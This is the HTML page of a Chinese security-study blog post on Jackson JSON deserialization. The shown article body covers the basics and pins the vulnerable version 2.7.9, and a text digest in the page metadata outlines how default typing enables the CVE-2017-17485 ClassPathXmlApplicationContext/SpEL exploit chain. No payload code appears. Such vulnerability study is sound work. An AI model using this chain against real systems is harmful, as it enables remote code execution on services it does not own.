<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Jackson反序列化初步学习 | stoocea</title><meta name="author" content="stoocea"><meta name="copyright" content="stoocea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Jackson反序列化初步学习"><meta name="application-name" content="Jackson反序列化初步学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Jackson反序列化初步学习"><meta property="og:url" content="http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><meta property="og:site_name" content="stoocea"><meta property="og:description" content="https:&amp;#x2F;&amp;#x2F;drun1baby.top&amp;#x2F;2023&amp;#x2F;12&amp;#x2F;07&amp;#x2F;Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&amp;#x2F;https:&amp;#x2F;&amp;#x2F;x"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"><meta property="article:author" content="stoocea"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"><meta name="description" content="https:&amp;#x2F;&amp;#x2F;drun1baby.top&amp;#x2F;2023&amp;#x2F;12&amp;#x2F;07&amp;#x2F;Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&amp;#x2F;https:&amp;#x2F;&amp;#x2F;x"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: stoocea","link":"链接: ","source":"来源: stoocea","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'stoocea',
  title: 'Jackson反序列化初步学习',
  postAI: '',
  pageFillDescription: 'Jackson 基本使用, 0x00 核心模块浅尝, 0x01 环境准备, 0x02 组件分析, 1x01 ObjectMapper, 2x01 将 json 转化为对象, 2x02 将对象转化为 json, 1x02 JsonParser, 1x03 JsonGenerator, 1x04 多态问题解决– JacksonPolymorphicDeserialization, 2x01 DefaultTyping, 3x01 JAVA_LANG_OBJECT, 3x02 OBJECT_AND_NON_CONCRETE, 3x03 NON_CONCRETE_AND_ARRAYS, 3x04 NON_FINAL, 2x02 @JsonTypeInfo注解, 3x01 JsonTypeInfo.Id.NONE, , 3x02 JsonTypeInfo.Id.CLASS, , 3x03 JsonTypeInfo.Id.NAME, 3x04 JsonTypeInfo.Id.CUSTOM, 3x05  JsonTypeInfo.Id.MINIMAL_CLASS, 1x05 反序列化中类属性方法调用, 2x01 enableDefaultTyping, 2x02 JsonTypeInfo.Id.CLASS, 0x03 工作流程分析, 1x00 环境搭建, 1x01 BeanDeserialzer–类的构造和 set 方法调用, 0x04 jackson 反序列化漏洞解析, 1x01 前置条件, 1x02  CVE-2017-17485  ClassPathXmlApplicationContext利用链, 2x01 影响版本, 2x02 环境搭建, 2x03 流程分析, 3x01 objectMapper–初步处理解析, 3x02 CPX 有参构造触发基本使用其实使用起来还是很广泛的之前学习的时候就感受到过它的默认解析器就是核心模块浅尝核心包提供最重要的基于流模式的解析功能相关的包括和注解包契合一系的开发模式提供注解相关功能数据绑定包提供基于对象绑定解析的相关以及基于树模型解析的相关什么意思呢我个人理解就是对于特定格式的数据处理需要有特定的处理方式这个包中的内容就是关于这部分的环境准备首先打上依赖组件分析他是中最常用的之所以被叫做就是因为它将映射到对象反序列化或者将对象映射到序列化作用范围很多能够从字符串流或者文件中解析将转化为对象直接看测试类类就不写了按照例写字段属性值就行输出结果如下将对象转化为输出结果如下其实还有很多方法这里就不一一列举了是一个底层一些的解析器也就是说用起来其实要比还要更快只不过用的前提要比麻烦的工作方式是将分解为一系列的令牌可以一个一个迭代令牌这些令牌其实是一个一个的字段属性值我们可以通过方法来判断当前生成的这一系列的令牌的键值对名是否为想要反序列化类的属性值名然后通过等方法获取出来首先判断当前取到的是不是也就是字段属性如果是的话那我们就可以通过去获取当前的字段属性了只作用于对象到字符串的转化使用起来还是比较麻烦的如果平常有序列化和反序列化的需求一般都是用了他里面的以及方法都挺方便的我们待会要进的流程也是从两者进入多态问题解决中多态的定义就不多谈了就是同一个接口由于有其不同的实例而执行不同的操作而在中也需要解决这个问题在中一般是使用来解决在反序列化某个对象的过程中如果类成员不是具体的类型比如是类型的接口或者抽象类那么我们可以在字符串中指定出来具体的类型将根据我们指定的具体类型来生成指定的类型实例简单来说就是将具体的子类信息绑定到序列化数据中就行只不过前提是我们这个类成员类型不能是具体的不然就不叫多态了具体实现呢就是和注解来实现先看本身就存在于的子类定义中然后它里面包含了个值这个值也就代表着我们能够通过去解决多态问题的条件当被序列化或反序列化的类里的属性被声明为一个类型时会对该类型的属性进行序列化和反序列化并明确规定类名这是加了的情况下如果不加结果如下发现我们指定的类并没有被序列化只是序列化了一个类其自读属性和一样当类中有类时对其进行序列化和反序列化这也是的默认选项结果如下发现接口也被序列化了继续增加作用范围这次可以序列化数组类型了结果如下这里会稍显不同我们看到在数组类的序列化数据前面有一个标识这其实是标识在序列化和反序列化的过程中对类型也执行了相同的操作如果不加也是相同的操作它会往属性字段塞一个数组进去并不会真得去反序列化这个具体类型这个更是重量级除了上述三个默认值的范围它还继续扩大可序列化的范围直至没有标识的属性字段都能被反序列化这里我们对类稍作修改然后测试类继续结果如下综述上面个默认属性对于序列化的范围是逐渐递增的类型描述说明属性的类型为属性的类型为属性的类型为所有除了声明为之外的属性注解一共支持下面种类型的取值下面逐个看使用案例先给类打上注解然后我们的测试类就不需要通过亲自去设置属性了结果如下发现好像和加没加注释没有区别它并没有去序列化具体的类型这其实也很容易想它本身注解里面就是那肯定是啥都不会去做的修改中注解内容为然后再经过一遍测试类发现这次多了很多东西首先就是最明显的加了一个标识符然后里面也确实例化了具体类但是我们还是看到的接口没有被序列化出来但是该序列化出的类还是还是修改中的注解然后运行测试类先看序列化的结果它包含了具体标识了类型但是没有获取全类名这也是为什么后续有个报错的原因这个其实是用来给用户自定义的我们必须自己手动写一个解析器才行没办法直接使用修改注解值然后测试发现之前的其实单单只是缩短了标识效果还是差不多的综上所述注解中能够使得我们进行反序列化的值有如下两个反序列化中类属性方法调用这里做个记录是为了给后续的反序列化流程调用做铺垫调试代码如下结果如下第一次无参构造是因为我在给中的字段赋值时实例化操作了那么可想而知的后面的操作就触发的无参构造方法先实例化了一个的对象然后调用方法再去赋值这是采用的设置下做的测试接下来尝试注解形式先注释掉测试代码中的操作然后再给类的指定字段属性值加上注解我们发现结果是一样的也就是说在的前提下反序列化操作都是会调用里面类如果这个时候我们再在类中方法和无参构造方法都加上标识调用了的调用了的调用了的调用的无参构造方法测试类不变发现其实只要是对于反序列化的操作都会有这种特性调用无参构造方法生成实例化对象调用方法赋值工作流程分析环境搭建下面是我本次工作流程调试的具体准备调用了的调用了的调用了的调用的无参构造方法类的构造和方法调用断点打在然后跟进这里直接跟进方法的内容获取初始配置然后读取的解析器配置然后调用其方法在方法中直接调用到了我们跟进方法首先跟进方法在方法中由于在指定类中存在无参构造方法所以这里会进入块调入进到方法的内容就是无参构造的执行了我们看一下的输出方法调用完目标类的无参构造方法生成实例化之后就开始进入循环读取字符串键值对中数据据此来进行字段属性值赋值其中会调用到方法进行具体的操作开始跟进具体内容也很简单他会匹配传入的键值对各自的属性如果是普通类型就直接调用赋值了如果是具体类情况的赋值还会先调用方法对其解析比如说我们当前大循环的中遍历到了属性值由于他是基本类型直接调用即可之后再调用两次直接跟进到变量的设置发现他会走进的方法中我们继续跟进判断我们当前要反序列化出来的东西是字段属性于是进入的情况继续跟进最终我们回到了的方法也就是说整个对于具体类的实例化操作都是遵循这一套组件和逻辑的那么现在要反序列化的实例化对象依然还是会走一遍我们上面分析的流程再看一眼的消息输出其实流程到这里就可以结束了因为之后的赋值操作都会经过循环完成我们需要的信息就是这一块无参构造调用流程以及方法的设置反序列化漏洞解析前置条件其实只要满足我们上面关于多态问题解决中开启设置能够反序列化的过程中进一步反序列化字段属性的实例化对象就行总结起来呢就是调用了函数对要进行反序列化的类的属性使用了值为的注解对要进行反序列化的类的属性使用了值为的注解三个任意满足一个就行然后就是链子的逻辑合理性了首先我们不可能遇到直接某一个类中的实例化方法或者方法有命令执行的可能必须一步一步调用寻找链子上面其实包含了两种攻击思路属性值有属性的情况下这种情况就算是为我们扩展了攻击面我们就不必强求入口类的构造方法或者方法有可能了只需要保证其属性字段中字段可控即可属性值没有属性的情况下只能通过当前类的构造方法和方法入手了漏洞复现阶段我没有去复现关于的分析直接来到后面的版本目前环境配置不出来利用链影响版本系列系列系列环境搭建请注意本次漏洞分析的环境依赖于等相关知识所以可能会涉及容器思想等中的特性这是我的依赖下面是测试代码然后这里我们还需要在本地模拟远程端写一个向容器中注入一个注意一下的格式不是正常的格式而是包括起来之前我们做测试的时候的字符串解析都会将包括的部分解析成具体实例化对象字段属性属于字段属性然后第一个参数是其类型第二参数为类中的某个属性值回忆起来这一点即可下面进入流程分析流程分析初步处理解析断点打在处流程和工作流程差不多但是由于的原因会初步判断输入字符串的类型然后调用不同的方法依然是跟进到方法处然后继续调用方法这里遇到的方法与我们之前遇到的有所不同因为第一参数不同我们给的是一个具体类参数类型的字符串不是传统的字符串所以这边会直接判断为我们在反序列化一个参数并且它的类型是具体的类所以会调用直接跟进到了然后调用的来解析我们输入的内容然后我们一直往下跟进到了的方法数据处理然后将处理过后的字符串继续调用这里又回到了熟悉的在方法中由于不和我们之前的正常的字符串处理情况相同这里会进入又是一段判断至于为什么会进的情况原因是一样的中对于包裹的字符串内容自动辨别为类中属性值为具体类的特殊情况所以此时解析器认为我们是在解析类中属性值跟进到情况的方法来反序列化字符串的内容最终调用了方法来创建实例化对象继续跟进首先会判断首先会判断我们当前指定序列化的类是否有构造方法如果有就不进判断进块有参构造触发开始调用其无参构造方法其参数为我们指定的配置文件的内容很自然的跟进到了的有参构造方法中这里调用父类的构造方法是为了给父类中参数赋值然后继续跟进方法方法中有一个方法它是用来处理这类配置文件中对于管理的方法参数为我们指定的容器地址本地测试的话一般都是指定到了文件中跟进这又继续调用了的在中跟进到通过配置文件中来获取类型之后存入的操作往下调用真正开始获取的类型在中具体解析的方法是方法它虽然返回值是布尔类型但里面具体走的逻辑会把的信息都完成解析根据方法名来说是在判断它是否是容器中的注意此时的参数和参数跟进到这里调用开始解析操作此时为也就是说暂时找不到我们当前想要的类型进入判断解析跟进到的内容首先获取然后获取由于我们刚才获取到的所有都是所以三个循环最终还是会出来直接调用到此时观察变量表我们已经获取到了了也就是说已经装载好了相对应的表达式解析器了继续跟进块中熟悉的表达式注入的味道既然对对象进行了获取并且也对表达式进行了解析那它必不可少绝对会有去触发果然在块的最后进行了操作中基本的使用必须要有表达式的解析器实体用来存放解析器解析后的结果如果有参数设置的需要要用到的上下文这里我们肯定是需要的重回我们写的文件首先的有参构造是必须要有的但是第二个标签属性为什么需要呢而且参数在并不需要这里涉及表达式执行的流程具体流程日后分析个人猜测是表达式内容是单独获取到之后再单独执行类似于下面的同样的效果',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-18 20:03:22',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">stoocea</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">Jackson反序列化初步学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-18T09:01:00.000Z" title="发表于 2024-03-18 17:01:00">2024-03-18</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-18T12:03:22.095Z" title="更新于 2024-03-18 20:03:22">2024-03-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://bu.dusays.com/2024/03/11/65ee76f777226.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><header><h1 id="CrawlerTitle" itemprop="name headline">Jackson反序列化初步学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">stoocea</span><time itemprop="dateCreated datePublished" datetime="2024-03-18T09:01:00.000Z" title="发表于 2024-03-18 17:01:00">2024-03-18</time><time itemprop="dateCreated datePublished" datetime="2024-03-18T12:03:22.095Z" title="更新于 2024-03-18 20:03:22">2024-03-18</time></header><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12966?time__1311=mqmhqIx+ODkDCDlxGofDyAID8UuyaqRG+D&alichlgref=https://www.google.com/#toc-6">https://xz.aliyun.com/t/12966?time__1311&#x3D;mqmhqIx%2BODkDCDlxGofDyAID8UuyaqRG%2BD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com%2F#toc-6</a><br><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</a></p>
<h1 id="Jackson-基本使用"><a href="#Jackson-基本使用" class="headerlink" title="Jackson 基本使用"></a>Jackson 基本使用</h1><p>jackson 其实使用起来还是很广泛的，之前学习 springMVC 的时候就感受到过，它的默认解析器就是 jackson。</p>
<h2 id="0x00-核心模块浅尝"><a href="#0x00-核心模块浅尝" class="headerlink" title="0x00 核心模块浅尝"></a>0x00 核心模块浅尝</h2><ul>
<li>jackson-core：核心包，提供最重要的基于流模式的解析功能相关的 API，包括 JsonParser 和 JsonGenerator</li>
<li>jackson-annotations：注解包，契合 spring 一系的开发模式，提供注解相关功能</li>
<li>jackson-databind:数据绑定包，提供基于”对象绑定”解析的相关 API（ObjectMapper）	,以及基于”树模型”解析的相关 API(JsonNode)，什么意思呢？我个人理解就是对于特定格式的 json 数据处理，需要有特定的处理方式，这个包中的内容就是关于这部分的</li>
</ul>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>首先打上依赖</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependencies<span class="token punctuation">></span></span>  
  <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>jackson<span class="token operator">-</span>databind<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">2.7</span><span class="token number">.9</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>  
  <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>  
  <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>jackson<span class="token operator">-</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">2.7</span><span class="token number">.9</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>  
  <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>  
  <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>jackson<span class="token operator">-</span>annotations<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">2.7</span><span class="token number">.9</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>  
  <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>  
<span class="token operator">&lt;</span><span class="token operator">/</span>dependencies<span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


